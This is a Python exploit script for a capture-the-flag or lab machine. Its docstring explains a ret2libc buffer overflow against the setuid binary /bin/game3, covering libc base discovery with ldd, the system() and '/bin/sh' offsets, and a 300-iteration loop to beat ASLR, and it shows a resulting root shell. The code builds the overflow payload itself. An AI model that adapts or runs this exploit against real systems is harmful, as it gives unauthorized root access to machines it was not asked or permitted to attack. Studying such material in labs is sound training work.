#!/usr/bin/env python


"""

To pwn /bin/game3 we need to exploit ret2libc technique since we got:
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

and plt section contains unhelpful functions.


You need to start by finding the libc_base_address from ldd on the
remote server: 

jigsaw@jigsaw:~$ ldd /bin/game3
	linux-gate.so.1 =>  (0xb772d000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7570000)
	/lib/ld-linux.so.2 (0xb772f000)

jigsaw@jigsaw:~$ ldd /bin/game3
	linux-gate.so.1 =>  (0xb775b000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb759e000)
	/lib/ld-linux.so.2 (0xb775d000)

You can understand that there is ASLR since the addresses change at each loading.

We could use 0xb759e000 in our example.

The next step is to get your system address and your /bin/sh string to execute as parameter.
To exit gracefully you can use this method to get exit() function too.

jigsaw@jigsaw:~$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   243: 0011b8a0    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

The address we need is 0x40310.

jigsaw@jigsaw:~$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin
 162d4c /bin/sh
 164790 /bin:/usr/bin
 164ccd /bin/csh
 166184 /etc/bindresvport.blacklist

 The address we need is 0x162d4c


You have to add this addresses to the libc_base_address.

Since there is ASLR you need to run your exploit in loop.
jigsaw@jigsaw:~$ for i in `seq 1 300`; do /bin/game3 `python exploit.py`; done

# id
uid=1000(jigsaw) gid=1000(jigsaw) euid=0(root) groups=0(root),1000(jigsaw)

Resource: https://spz.io/2018/10/18/buffer-overflow-return-to-libc/

"""


import struct

def p32(address):
	return struct.pack("<I", address)

libc_addr = 0xb759e000
libc_system_addr = 0x40310
libc_sh_addr = 0x162d4c


system_addr = p32(libc_addr + libc_system_addr)
sh_addr = p32(libc_sh_addr + libc_addr)

buf = ""
buf += "A" * 76
buf += system_addr
buf += "BBBB"
buf += sh_addr


print buf